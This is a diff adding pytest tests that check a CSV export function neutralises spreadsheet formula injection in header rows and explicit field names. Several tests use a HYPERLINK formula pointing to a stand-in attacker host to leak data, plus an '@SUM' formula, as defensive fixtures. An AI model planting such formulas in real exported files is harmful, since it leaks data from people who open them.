@@ -98,6 +98,36 @@ class TestExportCsvSanitization:
 
         assert rows[0]["name"] == f"'{trigger}payload"
 
+    def test_header_row_is_sanitized(self, tmp_path):
+        # Field names come from the scraped payload, so a formula can arrive as
+        # a key. Sanitizing only the cells leaves the header cell executable.
+        payload = '=HYPERLINK("https://attacker.example/leak","x")'
+        data = [{payload: "safe", "ok": "plain"}]
+        filepath = export_csv(data, tmp_path / "out.csv")
+
+        with open(filepath, newline="", encoding="utf-8") as f:
+            header = next(csv.reader(f))
+
+        assert header == ["'" + payload, "ok"]
+
+    def test_header_row_is_untouched_when_sanitize_is_false(self, tmp_path):
+        payload = '=HYPERLINK("https://attacker.example/leak","x")'
+        filepath = export_csv([{payload: "safe"}], tmp_path / "out.csv", sanitize=False)
+
+        with open(filepath, newline="", encoding="utf-8") as f:
+            header = next(csv.reader(f))
+
+        assert header == [payload]
+
+    def test_explicit_fields_are_sanitized_too(self, tmp_path):
+        payload = "@SUM(1,1)"
+        filepath = export_csv([{payload: "safe"}], tmp_path / "out.csv", fields=[payload])
+
+        with open(filepath, newline="", encoding="utf-8") as f:
+            header = next(csv.reader(f))
+
+        assert header == ["'" + payload]
+
     def test_export_auto_detect_forwards_sanitize_kwarg(self, tmp_path):
         payload = '=HYPERLINK("https://attacker.example/leak","x")'
         data = [{"name": payload}]
